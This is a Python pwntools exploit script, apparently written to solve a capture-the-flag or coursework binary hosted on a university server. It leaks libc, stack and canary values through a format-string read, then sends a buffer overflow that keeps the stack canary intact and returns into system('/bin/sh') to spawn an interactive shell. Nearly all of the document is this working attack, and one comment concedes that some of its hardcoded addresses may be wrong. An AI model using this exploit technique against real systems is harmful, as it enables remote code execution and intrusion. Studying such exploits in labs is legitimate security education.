#!/usr/bin/env python3


from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *do_print+40
            b *do_write+59
            b *do_write+216
            c
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10155)

    return r


def main():
    r = conn(3)

    sEsp =          0xfff49c80
    sCanaryAddr =   0xfff49cf4 # to be honest i don't think this addresses are correct (thise 2 in particular)

    offsetCanary = sCanaryAddr - sEsp
    offset4BCanary = offsetCanary // 0x4

    print(offset4BCanary)

    r.sendline(b"bla")
    r.sendline(b"W")
    r.sendline(b'%p.'*(offset4BCanary + 1 + 1))

    r.sendline(b"P")

    r.recvuntil(b"your buffer: ")
    output = r.recvuntil(b"\n")[:-2]
    print(output.decode("utf-8"))

    sLeakLibc = 0xf7f2b5a0
    sBaseLibc = 0xf7d7b000
    offsetToBaseLibc = sBaseLibc - sLeakLibc

    sStack =    0xff8d22b8
    sRip =      0xff8d21bc
    offsetToEip = sRip - sStack



    output = output[22:]

    leakLibc = int(output[:10].decode(), 16)
    output = output[11:]

    print("Leak Libc:", hex(leakLibc))

    leakStack = int(output[-10:].decode(), 16)
    output = output[:-11]

    print("Leak Stack:", hex(leakStack))

    leakCanary = int(output[-10:].decode(), 16)

    print("Leak Canary:", hex(leakCanary))


    leakEip = leakStack + offsetToEip

    leakBaseLibc = leakLibc + offsetToBaseLibc

    offsetSystem = libc.symbols[b"system"]
    offsetSh = next(libc.search(b"/bin/sh\x00"))

    leakSystem = leakBaseLibc + offsetSystem
    leakSh = leakBaseLibc + offsetSh

    print("Leak Eip:",          hex(leakEip))
    print("Leak Base Libc:",    hex(leakBaseLibc))
    print("Leak System:",       hex(leakSystem))
    print("/bin/sh:",           hex(leakSh))


    r.sendline(b"W")

    sbuffer = 0xfffb4f7c
    sCanary = 0xfffb4ffc
    offsetCanary = sCanary - sbuffer

    sBuffer =   0xff8f470c
    sEip =      0xff8f47ac
    offsetEip = sEip - sBuffer

    r.sendline(b"A"*offsetCanary + p32(leakCanary) + b"B"*(offsetEip - offsetCanary - 4) + p32(leakSystem) + b"C"*4 + p32(leakSh))

    r.interactive()


if __name__ == "__main__":
    main()
